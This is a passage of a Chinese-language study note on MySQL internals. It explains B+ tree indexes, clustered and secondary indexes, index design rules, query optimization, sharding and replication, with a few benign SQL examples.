<img src="..\\assets\post\2020-03-20\b+tree.png" alt="img" style="zoom:60%;" />
</div>
### 操作

进行查找操作时，首先在根节点进行二分查找，找到一个 key 所在的指针，然后递归地在指针所指向的节点进行查找。直到查找到叶子节点，然后在叶子节点上进行二分查找，找出 key 所对应的 data。

插入删除操作会破坏平衡树的平衡性，因此在进行插入删除操作之后，需要对树进行分裂、合并、旋转等操作来维护平衡性。

### B树和B+树的区别

- 在B树中，你可以将键和值存放在内部节点和叶子节点；但在B+树中，内部节点都是键，没有值，叶子节点同时存放键和值。

- B+树的叶子节点有一条链相连，而B树的叶子节点各自独立。

  ![img](https://imgconvert.csdnimg.cn/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAxOC85LzIxLzE2NWZiNjgyZTc1OWNmMTI?x-oss-process=image/format,png)

* **使用B树的好处**：B树可以在内部节点同时存储键和值，因此，把频繁访问的数据放在靠近根节点的地方将会大大提高热点数据的查询效率。这种特性使得B树在特定数据重复多次查询的场景中更加高效。
* **使用B+树的好处：**由于B+树的内部节点只存放键，不存放值，因此，一次读取，可以在内存页中获取更多的键，有利于更快地缩小查找范围。 B+树的叶节点由一条链相连，因此，当需要进行一次全数据遍历的时候，B+树只需要使用O(logN)时间找到最小的一个节点，然后通过链进行O(N)的顺序遍历即可。而B树则需要对树的每一层进行遍历，这会需要更多的内存置换次数，因此也就需要花费更多的时间。

### 数据库为什么使用B+树而不是B树

* B树只适合随机检索，而B+树同时支持随机检索和顺序检索；
* B+树空间利用率更高，可减少I/O次数，磁盘读写代价更低。一般来说，索引本身也很大，不可能全部存储在内存中，因此索引往往以索引文件的形式存储的磁盘上。这样的话，索引查找过程中就要产生磁盘I/O消耗。B+树的内部结点并没有指向关键字具体信息的指针，只是作为索引使用，其内部结点比B树小，盘块能容纳的结点中关键字数量更多，一次性读入内存中可以查找的关键字也就越多，相对的，IO读写次数也就降低了。而IO读写次数是影响索引检索效率的最大因素；
* B+树的查询效率更加稳定。B树搜索有可能会在非叶子结点结束，越靠近根节点的记录查找时间越短，只要找到关键字即可确定记录的存在，其性能等价于在关键字全集内做一次二分查找。而在B+树中，顺序检索比较明显，随机检索时，任何关键字的查找都必须走一条从根节点到叶节点的路，所有关键字的查找路径长度相同，导致每一个关键字的查询效率相当。
* B-树在提高了磁盘IO性能的同时并没有解决元素遍历的效率低下的问题。B+树的叶子节点使用指针顺序连接在一起，只要遍历叶子节点就可以实现整棵树的遍历。而且在数据库中基于范围的查询是非常频繁的，而B树不支持这样的操作。
  增删文件（节点）时，效率更高。因为B+树的叶子节点包含所有关键字，并以有序的链表结构存储，这样可很好提高增删效率。

### B+树与红黑树的比较

红黑树等平衡树也可以用来实现索引，但是文件系统及数据库系统普遍采用 B+ Tree 作为索引结构，这是因为使用 B+ 树访问磁盘数据有更高的性能。

**（一）B+ 树有更低的树高**

平衡树的树高 `O(h)=O(logdN)`，其中 d 为每个节点的出度。红黑树的出度为 2，而 B+ Tree 的出度一般都非常大，所以红黑树的树高 h 很明显比 B+ Tree 大非常多。

**（二）磁盘访问原理**

操作系统一般将内存和磁盘分割成固定大小的块，每一块称为一页，内存与磁盘以页为单位交换数据。数据库系统将索引的一个节点的大小设置为页的大小，使得一次 I/O 就能完全载入一个节点。

如果数据不在同一个磁盘块上，那么通常需要移动制动手臂进行寻道，而制动手臂因为其物理结构导致了移动效率低下，从而增加磁盘数据读取时间。B+ 树相对于红黑树有更低的树高，进行寻道的次数与树高成正比，在同一个磁盘块上进行访问只需要很短的磁盘旋转时间，所以 B+ 树更适合磁盘数据的读取。

**（三）磁盘预读特性**

为了减少磁盘 I/O 操作，磁盘往往不是严格按需读取，而是每次都会预读。预读过程中，磁盘进行顺序读取，顺序读取不需要进行磁盘寻道，并且只需要很短的磁盘旋转时间，速度会非常快。并且可以利用预读特性，相邻的节点也能够被预先载入。

### 为什么B+树对磁盘友好？

- **磁盘读写代价低**：书的非叶子节点没有数据，这样索引较小，可以放在一个block里面，避免了树形结构不断地向下查找，然后不停的寻道，读数据，这样设计可以降低IO的次数
- **查询效率更加稳定**：非叶子节点并不是最终指向文件内容的节点，而只是叶子节点中关键字的索引，索引任何关键字的查询必须走一条从根节点到叶子节点的路，所有关键字查询的路径长度相同，导致每个数据的查找速率相当。
- **遍历所有的数据更方便**：B+树只要遍历叶子节点就可以实现整个树的遍历。

### Hash索引和B+树索引有什么区别或者说优劣呢?

首先要知道Hash索引和B+树索引的底层实现原理：

hash索引底层就是hash表，进行查找时，调用一次hash函数就可以获取到相应的键值，之后进行回表查询获得实际数据。B+树底层实现是多路平衡查找树。对于每一次的查询都是从根节点出发，查找到叶子节点方可以获得所查键值，然后根据查询判断是否需要回表查询数据。

那么可以看出他们有以下的不同：

* hash索引进行等值查询更快(一般情况下)，但是却无法进行范围查询。

因为在hash索引中经过hash函数建立索引之后，索引的顺序与原顺序无法保持一致，不能支持范围查询。而B+树的的所有节点皆遵循(左节点小于父节点，右节点大于父节点，多叉树也类似)，天然支持范围。

* hash索引不支持使用索引进行排序，原理同上。
* hash索引不支持模糊查询以及多列索引的最左前缀匹配。原理也是因为hash函数的不可预测。AAAA和AAAAB的索引没有相关性。
* hash索引任何时候都避免不了回表查询数据，而B+树在符合某些条件(聚簇索引，覆盖索引等)的时候可以只通过索引完成查询。

* hash索引虽然在等值查询上较快，但是不稳定。性能不可预测，当某个键值存在大量重复的时候，发生hash碰撞，此时效率可能极差。而B+树的查询效率比较稳定，对于所有的查询都是从根节点到叶子节点，且树的高度较低。

因此，在大多数情况下，直接选择B+树索引可以获得稳定且较好的查询速度。而不需要使用hash索引。

## 索引

### 基本介绍

索引是存储引擎用于快速找到记录的一种数据结构。

**任何标准表最多可以创建16个索引列。**

索引是在存储引擎层实现的，而不是在服务器层实现的，所以不同存储引擎具有不同的索引类型和实现。

### 基本原理

索引用来快速地寻找那些具有特定值的记录。如果没有索引，一般来说执行查询时遍历整张表。

索引的原理很简单，就是把无序的数据变成有序的查询

把创建了索引的列的内容进行排序

对排序结果生成倒排表

在倒排表内容上拼上数据地址链

在查询的时候，先拿到倒排表内容，再取出数据地址链，从而拿到具体数据。

### 索引的优缺点

**索引的优点：**

可以大大加快数据的检索速度，这也是创建索引的最主要的原因。
通过使用索引，可以在查询的过程中，使用优化隐藏器，提高系统的性能。
**索引的缺点：**

时间方面：创建索引和维护索引要耗费时间，具体地，当对表中的数据进行增加、删除和修改的时候，索引也要动态的维护，会降低增/改/删的执行效率；
空间方面：索引需要占物理空间。

### B+Tree索引

是大多数 MySQL 存储引擎的默认索引类型。

因为不再需要进行全表扫描，只需要对树进行搜索即可，所以查找速度快很多，B+索引在数据库中有一个特点是高出度，因此在数据库中B+树的高度一般都在2-4层，也就是说查询某一键值的行记录最多需要2到4次IO。

因为 B+ Tree 的有序性，所以除了用于查找，还可以用于排序和分组。可以指定多个列作为索引列，多个索引列共同组成键。

适用于全键值、键值范围和键前缀查找，其中键前缀查找只适用于最左前缀查找。如果不是按照索引列的顺序进行查找，则无法使用索引。

InnoDB 的 B+Tree 索引分为**主（聚簇）索引和辅助（非聚簇）索引**。

主索引的叶子节点 data 域记录着完整的数据记录，这种索引方式被称为聚簇索引。因为无法把数据行存放在两个不同的地方，所以一个表只能有一个**聚簇索引**。

辅助索引的叶子节点的data域记录着主键的值，因此在使用辅助索引查找时，需要先查找到**主键值**，然后再到主索引中进行查找。

### 聚簇索引

按照每张表的主键构造一个B+树，同时叶子节点中存放的即为整张表的行记录数据，也将聚集索引的叶子节点称为数据页。

每个数据页使用双向链表来进行链接。

聚簇索引的存储并不是物理上连续的，而是逻辑上连续的：页通过双向链表链接，页按照主键的顺序排序；每个页中的记录也是通过双向链表进行维护的。

另一个好处是对于主键的排序查找和范围查找速度非常快。

**缺点：**

- 最大限度提交了IO密集型应用的性能，如果数据全部在内存中将会失去优势
- 更新聚簇索引列的代价很高，因为会强制每个被更新的行移动到新位置
- 基于聚簇索引的表插入新行或者主键被更新导致行移动时，可能导致**页分裂**，表会占用更多磁盘空间
- 当行稀疏或由于页分裂导致数据存储不连续时，全表扫描可能很慢。

特点：

  1）自动建立，一个表**只有1个**。

  2）**叶子节点包含所有用户记录（包括隐藏列），record_type为0**

  3）**每层节点都是按照主键从小到大排序**

  4）内节点（非叶子节点）：存储主键值以及页号， record_type为1

  注意：

  聚集索引的存储并不是物理上的连续，而是逻辑上的连续。这其中有两点

  a. 前面说过的页通过双向链表链接，页按照主键的顺序排序，

  b. 每个页中的记录是通过单向链表进行维护的，物理存储上可以同样不按照主键存储。

### 非聚簇索引（辅助索引）

叶子节点不包含行记录的全部数据，除了包含键值之外，每个叶子节点中的索引行中还包含一个**书签**。

该书签告诉InnoDB引擎哪里可以找到与索引相对应的行数据。在InnoDB中，这个书签就是相应行数据的聚簇索引主键值。

表数据和索引是分成两部分存储的，主键索引和二级索引存储上没有任何区别。使用的是B+树作为索引的存储结构，所有的节点都是索引，叶子节点存储的是索引+索引对应的记录的数据。

 辅助索引的存在并不影响数据在聚集索引中的组织，因此每张表上可以有多个辅助索引。当通过辅助索引来寻找数据时，InnoDB存储引擎会遍历辅助索引并通过叶级别的指针获得指向主键索引的主键，然后再通过主键索引来找到一个完整的行记录。

### 何时使用聚簇索引与非聚簇索引

![img](https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xMDE1NDQ5OS1kNTNhNWNlOWNlY2YyMmYzLnBuZw?x-oss-process=image/format,png)

### 联合索引

 联合索引是一种特殊的二级索引。联合索引指的是同时对多列创建的索引，创建联合索引后，叶子节点会同时包含每个索引列的值，并且同时根据多列排序，这个排序和我们所理解的字典序类似。

   每个叶子节点同时保存了所有的索引列，除此之外，还是只包含了主键id。

 **特点：**

   1）**手动创建，可以有多个**

   2）**内节点包含索引列、主键列、页号**

   3）**叶子节点只包含索引列以及记录主键的值**

   4）每层节点先按照索引中的**第1列**排序。第1列值相等时，按第2列排序。第2列值相等时，按第3列排序 依次类推，所有列都相等时按照主键排序。

### 哈希索引

哈希索引能以 O(1) 时间进行查找，但是失去了有序性：

- 无法用于排序与分组；
- 只支持精确查找，**无法用于部分查找和范围查找**。

InnoDB 存储引擎有一个特殊的功能叫“**自适应哈希索引**”，当某个索引值被使用的非常频繁时，会在 B+Tree 索引之上再创建一个哈希索引，这样就让 B+Tree 索引具有哈希索引的一些优点，比如快速的哈希查找。

### 全文索引

MyISAM 存储引擎支持全文索引，用于**查找文本中的关键词，而不是直接比较是否相等**。

查找条件使用 MATCH AGAINST，而不是普通的 WHERE。

全文索引使用**倒排索引**（第二种表现形式）实现，它记录着关键词到其所在文档的映射。

InnoDB 存储引擎在 MySQL 5.6.4 版本中也开始支持全文索引。

### 倒排索引

在辅助表（单词存放的表）中存储了单词与单词自身在一个或者多个文档中所在位置之间的映射，这通常利用关联数组实现，拥有两种表现形式：

```
inverted file index: {单词，单词所在的ID}
full inverted index: {单词，(单词所在文档的ID，在具体文档中的位置)}
```

### 空间数据索引

MyISAM 存储引擎支持空间数据索引（R-Tree），可以用于地理数据存储。空间数据索引会从所有维度来索引数据，可以有效地使用任意维度来进行组合查询。

必须使用 GIS 相关的函数来维护数据。

### B+树索引的管理

索引的创建和删除可以通过两种方法，一种是`ALTER TABLE`，另一种是`CREATE/DROP INDEX`

### Cardinality值

并不是所有的查询条件中出现的列都需要添加索引，对于什么时候添加索引，一般是在访问表中很少一部分时使用B+树索引才有意义。

如果某个字段的取值范围很广，几乎没有重复，即属于高选择性，则使用B+树索引是最适合的。

Cardinality值表示索引中不重复记录数量的预估值，不是一个准确值。在实际应用中cardinality/n_rows_in_table应当尽可能接近1.

## 索引使用场景

### where

![img](https://imgconvert.csdnimg.cn/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAxOS8yLzE5LzE2OTA0NTk2ZTFiNTU4YjI?x-oss-process=image/format,png)

上图中，根据`id`查询记录，因为`id`字段仅建立了主键索引，因此此SQL执行可选的索引只有主键索引，如果有多个，最终会选一个较优的作为检索的依据。

```
-- 增加一个没有建立索引的字段
alter table innodb1 add sex char(1);
-- 按sex检索时可选的索引为null
EXPLAIN SELECT * from innodb1 where sex='男';
```

![img](https://imgconvert.csdnimg.cn/aHR0cHM6Ly91c2VyLWdvbGQtY2RuLnhpdHUuaW8vMjAxOS8yLzE5LzE2OTA0NTk2Zjk1YTdmOTk?x-oss-process=image/format,png)



可以尝试在一个字段未建立索引时，根据该字段查询的效率，然后对该字段建立索引（`alter table 表名 add index(字段名)`），同样的SQL执行的效率，你会发现查询效率会有明显的提升（数据量越大越明显）。

### order by

当我们使用order by将查询结果按照某个字段排序时，如果该字段没有建立索引，那么执行计划会将查询出的所有数据使用外部排序（将数据从硬盘分批读取到内存使用内部排序，最后合并排序结果），这个操作是很影响性能的，因为需要将查询涉及到的所有数据从磁盘中读到内存（如果单条数据过大或者数据量过多都会降低效率），更无论读到内存之后的排序了。

但是如果我们对该字段建立索引alter table 表名 add index(字段名)，那么由于索引本身是有序的，因此直接按照索引的顺序和映射关系逐条取出数据即可。而且如果分页的，那么只用取出索引表某个范围内的索引对应的数据，而不用像上述那取出所有数据进行排序再返回某个范围内的数据。（从磁盘取数据是最影响性能的）

### join

对`join`语句匹配关系（`on`）涉及的字段建立索引能够提高效率

## 索引的设计原则

* 适合索引的列是出现在where子句中的列，或者连接子句中指定的列
* 基数较小的类，索引效果较差，没有必要在此列建立索引
* 使用短索引，如果对长字符串列进行索引，应该指定一个前缀长度，这样能够节省大量索引空间
* 不要过度索引。索引需要额外的磁盘空间，并降低写操作的性能。在修改表内容的时候，索引会进行更新甚至重构，索引列越多，这个时间就会越长。所以只保持需要的索引有利于查询即可。

## 创建索引的原则

1） 最左前缀匹配原则，组合索引非常重要的原则，mysql会一直向右匹配直到遇到范围查询(>、<、between、like)就停止匹配，比如a = 1 and b = 2 and c > 3 and d = 4 如果建立(a,b,c,d)顺序的索引，d是用不到索引的，如果建立(a,b,d,c)的索引则都可以用到，a,b,d的顺序可以任意调整。

2）较频繁作为查询条件的字段才去创建索引

3）更新频繁字段不适合创建索引

4）若是不能有效区分数据的列不适合做索引列(如性别，男女未知，最多也就三种，区分度实在太低)

5）尽量的扩展索引，不要新建索引。比如表中已经有a的索引，现在要加(a,b)的索引，那么只需要修改原来的索引即可。

6）定义有外键的数据列一定要建立索引。

7）对于那些查询中很少涉及的列，重复值比较多的列不要建立索引。

8）对于定义为text、image和bit的数据类型的列不要建立索引。

## 使用索引查询一定能提高查询的性能吗？为什么

通常，通过索引查询数据比全表扫描要快。但是我们也必须注意到它的代价。

* 索引需要空间来存储，也需要定期维护， 每当有记录在表中增减或索引列被修改时，索引本身也会被修改。 这意味着每条记录的INSERT，DELETE，UPDATE将为此多付出4，5 次的磁盘I/O。 因为索引需要额外的存储空间和处理，那些不必要的索引反而会使查询反应时间变慢。使用索引查询不一定能提高查询性能，
* 索引范围查询(INDEX RANGE SCAN)适用于两种情况:
  * 基于一个范围的检索，一般查询返回结果集小于表中记录数的30%
  * 基于非唯一性索引的检索

## 回表

如果是通过非主键索引进行查询，select所要获取的字段不能通过非主键索引获取到，需要通过非主键索引获取到的主键，从聚集索引再次查询一遍，获取到所要查询的记录，这个查询的过程就是回表

## 索引，主键，唯一索引，联合索引的区别

**索引**是一种特殊的文件(InnoDB数据表上的索引是表空间的一个组成部分)，它们包含着对数据表里所有记录的引用指针。

**普通索引**(由关键字KEY或INDEX定义的索引)的唯一任务是加快对数据的访问速度。

**普通索引**允许被索引的数据列包含重复的值。如果能确定某个数据列将只包含彼此各不相同的值，在为这个数据列创建索引的时候就应该用关键字UNIQUE把它定义为一个唯一索引。也就是说，唯一索引可以保证数据记录的唯一性。

**主键**，是一种特殊的唯一索引，在一张表中只能定义一个主键索引，主键用于唯一标识一条记录，使用关键字 PRIMARY KEY 来创建。

**索引**可以覆盖多个数据列，如像INDEX(columnA, columnB)索引，这就是联合索引。

**索引**可以极大的提高数据的查询速度，但是会降低插入、删除、更新表的速度，因为在执行这些写操作时，还要操作索引文件。

## 主键、外键和索引的区别？

**定义：**

主键–唯一标识一条记录，不能有重复的，不允许为空

外键–表的外键是另一表的主键, 外键可以有重复的, 可以是空值

索引–该字段没有重复值，但可以有一个空值

**作用：**

主键–用来保证数据完整性

外键–用来和其他表建立联系用的

索引–是提高查询排序的速度

**个数：**

主键–主键只能有一个

外键–一个表可以有多个外键

索引–一个表可以有多个唯一索引

## InnoDB的主键选择和插入优化

- 在使用InnoDB存储引擎时，如果没有特别的需要，就选择一个与业务无关的自增字段作为主键
- 如果不设置主键，InnoDB会自己设置主键或者添加一列隐藏主键列
- 从数据库优化角度看，必须使用自增主键，因为：
  - 每个叶子节点都有固定的大小，如果存储的data将要溢出，那么mysql会开辟一个新的节点来存储；
    - 1，如果使用自增主键，那么每次插入新的记录，记录就会顺序添加到后续的位置，形成一个紧凑的索引结构，每次插入就不用移动现有数据，所以不会增加很多维护索引的开销
    - 2，如果使用非自增主键，那么每次插入新的记录都是近乎随机，那么就会劈坏已有的索引结构，需要mysql频繁移动记录位置，造成很多碎片。后续不得不通过OPTIMIZE TABLE来重建表并优化填充页面。
- 自增主键和uuid比较：
  - 自增主键：
    - 优点：数据库自动编号，速度快，而且是增量增长，按照顺序存放，对于检索很有利；数字型，占用空间小，易于排序，在程序中传递也方便；如果通过非系统增加记录时，可以不用指定该字段，不用担心主键重复的问题。
    - 缺点：当需要手动导入数据或者与新旧系统双向同步的时候会导致大范围冲突
  - uuid：
    - 优点：出现数据拆分、合并存储的时候，能达到全局的唯一性
    - 缺点：影响插入速度，并且造成硬盘使用率低；作为索引主键，uuid（字符串）之间比较大小相比于数字慢不少，影响查询速度；uuid占空间大，这样如果建立的索引越多，影响越严重。

## mysql中 in 和 exists 区别

mysql中的in语句是把外表和内表作hash 连接，而exists语句是对外表作loop循环，每次loop循环再对内表进行查询。一直大家都认为exists比in语句的效率要高，这种说法其实是不准确的。这个是要区分环境的。

* 如果查询的两个表大小相当，那么用in和exists差别不大。
* 如果两个表中一个较小，一个是大表，则子查询表大的用exists，子查询表小的用in。
* not in 和not exists：如果查询语句使用了not in，那么内外表都进行全表扫描，没有用到索引；而not extsts的子查询依然能用到表上的索引。所以无论那个表大，用not exists都比not in要快。

## 索引优化

#### 多列索引（联合索引）

在需要使用多个列作为条件进行查询时，使用**多列索引比使用多个单列索引性能更好**。

##### 最左前缀原则

建立多列索引时有最左前缀的原则，即最左优先。

例子：如果有一个２列的（col1,col2），则已经对(col1)，(col1,col2)建立了索引。

- B+树的数据项是复合的数据结构，比如(name,age,sex)的时候，B+树是按照从左到右的顺序来建立搜索树的，比如当（张三,20,F）这样的数据来检索的时候，B+树会优先比较name来确定下一部的所搜方向，如果name相同再依次比较age和sex，最后得到检索的数据；但当（20，F）这样的没有name的数据来的时候，B+树就不知道第一步该查哪一个节点，因为建立搜索树的时候name就是第一个比较因子，必须要先根据name来搜索才能知道下一步去哪里查询。
- 比如当以（张三,F）这样的数据来检索时，B+树可以用name来指定搜索方向，但是下一个字段age的缺失，所以只能把名字为张三的数据找到，然后再匹配性别是F的数据，这就是索引的最左匹配特性。

说明：

- 最左前缀匹配原则，mysql会一直向右匹配直到遇到范围查询（>、<、between、like）就停止匹配，比如`a=1 and b=2 and c>3 and d=4`如果建立(a,b,c,d)顺序的索引，d是用不到索引的，如果建立(a,b,d,c)的索引则都可以用到，并且abd的顺序可以任意。
- =和in可以乱序，比如`a=1 and b=2 and c=3`建立(a,b,c)索引可以任意顺序，mysql的查询优化器可以优化成索引可以识别的形式

#### 索引列顺序

让**选择性最强的索引列放在前面**。

索引的选择性是指：不重复的索引值和记录总数的比值。

最大值为 1，此时每个记录都有唯一的索引与其对应。选择性越高，每个记录的区分度越高，查询效率也越高。

#### 前缀索引

对于BLOB，TEXT和VARCHAR类型的列，必须使用前缀索引，只索引开始的那部分字符。

前缀长度的选取需要根据索引选择性来确定。

#### 覆盖索引

辅助索引中包含了所有需要查询的字段的值，可以直接返回不需要再去查询数据库，这种现象称为覆盖索引。

具有以下优点：

- 索引通常远小于数据行的大小，只读取索引能大大减少数据访问量。
- 一些存储引擎（例如 MyISAM）在内存中只缓存索引，而数据依赖于操作系统来缓存。因此，只访问索引可以不使用系统调用（通常比较费时）。
- 对于 InnoDB 引擎，若辅助索引能够覆盖查询，则无需访问主索引。

#### 索引提示

MySQL数据库支持索引提示，即显式的告诉优化器使用哪个索引，在以下情况时使用：

- MYSQL数据库的优化器错误的选择了某个索引，导致sql语句运行的很慢。
- 某sql语句可以选择的索引非常多，这时优化器选择执行计划时间的开销可能会大于sql本身。

#### Multi-Range Read优化

目的是为了减少磁盘的随机访问，并且将随机访问转化为较为顺序的数据访问，这对于IO-bound类型的sql查询语句可带来性能极大的提升。

有以下好处：

- 是数据访问变得较为顺序。在查询辅助索引时，首先根据得到的查询结果，按照主键进行排序，并按照主键排序的顺序进行书签查找。
- 减少缓冲池中页被替换的次数。
- 批量处理对键值的查询操作。

### 索引失效的情况

- 如果索引列出现了隐式类型转换，则Mysql不会使用索引。常见的情况是在sql的where条件中字段类型为字符串，其值为数值，如果没有加引号，那么不会使用索引。
- 如果where条件中含有OR，除非OR前使用了索引列而OR之后是非索引列，否则索引会失效
- Mysql不能在索引中执行like操作，这时底层存储引擎api的限制，最左匹配的like比较会被转换为简单的比较操作，但如果是以通配符开头的like查询，存储引擎就无法做比较。这种情况下mysql只能提取数据行的值而不是索引值来做比较。
- 如果查询中的列不是独立的，则Mysql不会使用索引，独立的列是指索引列不能是表达式的一部分，也不能是函数的参数
- 对于多个**范围条件**查询，mysql无法使用第一个范围列后面的其他索引列，对于多个等值查询则没有这个限制。
- 如果mysql判断全表扫描比使用索引查询更快，则不会使用索引。
- 索引文件具有b-tree的最左前缀匹配特性，如果左边的值未确定，那么无法使用索引。

# MySQL查询优化

使用EXPLAIN可以分析select查询语句的性能，可以通过分析EXPLAIN结果来优化查询语句。

其中EXPLAIN结果中比较重要的字段有：

- `select_type:`查询类型，有简单查询、联合查询、自查询等
- `key`：使用的索引
- `rows`：扫描的行数

## 优化Mysql（简要版）

### 硬件和配置的优化

- cpu饱和：CPU在饱和的时候一般发生在数据装入内存或从磁盘上读取数据时候
- io瓶颈：磁盘I/O瓶颈发生在装入数据远大于内存容量的时候，如果应用分布在网络上，那么查询量相当大的时候那么平瓶颈就会出现在网络上

### Mysql内部优化

- sql语句优化
  - 只返回必要的列：最好不要使用select *语句
    - 会查询不需要的列或者大文本的字段，增加数据库解析的工作量，网络开销和磁盘io操作
    - 失去了覆盖索引优化的可能性，比如某一个查询只需要通过辅助索引就可以得到结果，但是用了select*就必须要再去通过聚簇索引去查询所有列，多了一次b+树查询。
  - 只返回必要的行：使用limit语句来限制返回的语句
  - 缓存重复查询的数据：使用缓存可以避免在数据库中进行查询，特别在要查询的数据经常被重复查询时，缓存带来的查询性能提升是非常明显的。

- 索引优化：
  - 使用自增型的主键
  - 索引的长度尽量短，节省索引空间
  - 基数较小的字段建立索引的效果差，需要考虑
- 慢查询优化：用慢查询日志记录查询时间很长的查询语句，然后优化相对应的查询语句
  - 查询时，能不要就不用，尽量写全字段名
  - 大部分情况连接效率远大于子查询
  - 多使用explain和profile分析查询语句
  - 查看慢查询日志，找出执行时间长的sql语句优化
  - 多表连接时，尽量小表驱动大表，即小表 join 大表
  - 在千万级分页时使用limit
  - 对于经常使用的查询，可以开启缓存
- 数据表结构优化
  - 表的字段尽可能用NOT NULL
  - 字段长度固定的表查询会更快
  - 把数据库的大表按时间或一些标志分成小表
  - 将表拆分
    - 数据表拆分：主要就是垂直拆分和水平拆分
    - 水平切分：将记录散列到不同的表中，各表的结构完全相同，每次从分表中查询, 提高效率
    - 垂直切分：将表中大字段单独拆分到另外一张表, 形成一对一的关系

## 优化数据访问

#### 减少请求的数据量

- 只返回必要的列：最好不要使用select *语句
- 只返回必要的行：使用limit语句来限制返回的语句
- 缓存重复查询的数据：使用缓存可以避免在数据库中进行查询，特别在要查询的数据经常被重复查询时，缓存带来的查询性能提升是非常明显的。

#### 减少服务端扫描的行数

- 最有效的方式就是使用索引来覆盖查询

## 重构查询方式

#### 切分大查询

一个大查询如果一次性执行的话，可能一次锁住很多数据、占满整个事务日志、耗尽系统资源、阻塞很多小的但重要的查询。

#### 分解大连接查询

将一个大连接查询分解成对每一个表进行一次单表查询，然后在应用程序中进行关联，这样做的好处有：

- 让缓存更高效。对于连接查询，如果其中一个表发生变化，那么整个查询缓存就无法使用。而分解后的多个查询，即使其中一个表发生变化，对其它表的查询缓存依然可以使用。
- 分解成多个单表查询，这些单表查询的缓存结果更可能被其它查询使用到，从而减少冗余记录的查询。
- 减少锁竞争；
- 在应用层进行连接，可以更容易对数据库进行拆分，从而更容易做到高性能和可伸缩。
- 查询本身效率也可能会有所提升。例如下面的例子中，使用 IN() 代替连接查询，可以让 MySQL 按照 ID 顺序进行查询，这可能比随机的连接要更高效。

## MySQL分库分表

主要目的是为了解决单库单表数据过多，查询缓慢的问题，解决数据扩展性问题。

### 数据库瓶颈

#### IO瓶颈

- 磁盘读IO瓶颈，热点数据太多，数据库缓存放不下，每次查询都会产生大量的IO，降低查询速度。**适合分库和垂直分表**
- 网络IO瓶颈，请求的数据太多，网络宽带不够。**适合分库**

#### CPU瓶颈

- SQL问题，比如SQL中包含join，group by，order by，非索引字段条件查询等，增加CPU运算的操作。适合使用SQL优化，建立合适的索引，在业务service层进行业务计算解决。
- 单表数据量太大，查询扫描行太多，SQL效率低，CPU率先出现瓶颈。**适合水平分表**

### 分库

#### 水平分库

以字段为依据，按照一定策略（hash，range等），将一个库中的数据拆分到多个库中。

**场景：**系统绝对并发量上来了，分表难以根本上解决问题，并且还没有明显的业务归属来垂直分库。

#### 垂直分库

以表为依据，按照业务归属不同，将不同的表拆分到不同的库中。

**场景：**系统绝对并发量上来了，并且可以抽象出单独的业务模块。随着业务的发展一些公用的配置表，字典表等越来越多，这是可以将这些表拆到单独的库中，甚至可以服务化。再有，随着业务的发展孵化出了一套业务模式，这时可以将相关的表拆到单独的库中，甚至可以服务化。

### 分表

#### 水平分表

以字段为依据，按照一定策略（hash，range等），将一个表中的数据拆分到多个表中。

**场景：**系统绝对并发量没有上来，只是单表的数据量太多，影响了SQL效率，加重了CPU负担，以至于成为瓶颈。

#### 垂直分表

以字段为依据，按照字段的活跃性，将表中字段拆到不同的表（主表和扩展表）中

**场景：**系统绝对并发量没有上来，表的记录并不多，但是字段多，并且热点数据和非热点数据在一起，单行数据所需的存储空间较大。以至于数据库缓存的数据库减少，查询时回去读取磁盘数据产生大量的随机读IO，产生IO瓶颈。

### 分库分表带来的问题

* 事务支持 分库分表后，就成了分布式事务了。如果依赖数据库本身的分布式事务管理功能去执行事务，将付出高昂的性能代价； 如果由应用程序去协助控制，形成程序逻辑上的事务，又会造成编程方面的负担。

* 跨库join

  只要是进行切分，跨节点Join的问题是不可避免的。但是良好的设计和切分却可以减少此类情况的发生。解决这一问题的普遍做法是分两次查询实现。在第一次查询的结果集中找出关联数据的id,根据这些id发起第二次请求得到关联数据。 

* 跨节点的count,order by,group by以及聚合函数问题 这些是一类问题，因为它们都需要基于全部数据集合进行计算。多数的代理都不会自动处理合并工作。解决方案：与解决跨节点join问题的类似，分别在各个节点上得到结果后在应用程序端进行合并。和join不同的是每个结点的查询可以并行执行，因此很多时候它的速度要比单一大表快很多。但如果结果集很大，对应用程序内存的消耗是一个问题。

* 数据迁移，容量规划，扩容等问题 来自淘宝综合业务平台团队，它利用对2的倍数取余具有向前兼容的特性（如对4取余得1的数对2取余也是1）来分配数据，避免了行级别的数据迁移，但是依然需要进行表级别的迁移，同时对扩容规模和分表数量都有限制。总得来说，这些方案都不是十分的理想，多多少少都存在一些缺点，这也从一个侧面反映出了Sharding扩容的难度。

* ID问题

* 一旦数据库被切分到多个物理结点上，我们将不能再依赖数据库自身的主键生成机制。一方面，某个分区数据库自生成的ID无法保证在全局上是唯一的；另一方面，应用程序在插入数据之前需要先获得ID,以便进行SQL路由. 一些常见的主键生成策略
  

# MySQL主从复制

### 作用

复制解决的基本问题是让一台服务器的数据与其他服务器保持同步，一台主库的数据可以同步到多台备库上，备库本身也可以被配置成另外一台服务器的主库。主库和备库之间可以有多种不同的组合方式。

MySQL 支持两种复制方式：基于行的复制和基于语句的复制，基于语句的复制也称为逻辑复制，从 MySQL 3.23 版本就已存在，基于行的复制方式在 5.1 版本才被加进来。这两种方式都是通过**在主库上记录二进制日志、在备库重放日志的方式来实现异步的数据复制**。因此同一时刻备库的数据可能与主库存在不一致，并且无法包装主备之间的延迟。

MySQL 复制大部分是**向后兼容**的，新版本的服务器可以作为老版本服务器的备库，但是老版本不能作为新版本服务器的备库，因为它可能无法解析新版本所用的新特性或语法，另外所使用的二进制文件格式也可能不同。

复制解决的问题：**数据分布、负载均衡、备份、高可用性和故障切换、MySQL 升级测试**。

### 步骤

- **在主库上把数据更改记录到二进制文件binary log中**；数据库每次在准备提交事务完成数据更新前，主库将数据更新的事件记录到二进制日志中。Mysql会按照事务提交的顺序而非每条语句的执行顺序来记录二进制文件，在记录二进制日志后，主库会告知存储引擎可以提交事务了。
- **备库将主库的日志复制到自己的中继日志relay log中**；备库首先启动一个工作的IO线程，跟主库建立一个普通的客户端连接，然后再主库上启动一个特殊的二进制转储线程，这个线程会读取主库上二进制日志中的事件。他不会对事件进行轮询。如果该线程最赶上了主库的进度就进入睡眠状态，直到主库发送信号量通知其有新的事件产生时才会被唤醒，备库IO线程会将接收到的事件记录到中继日志中。
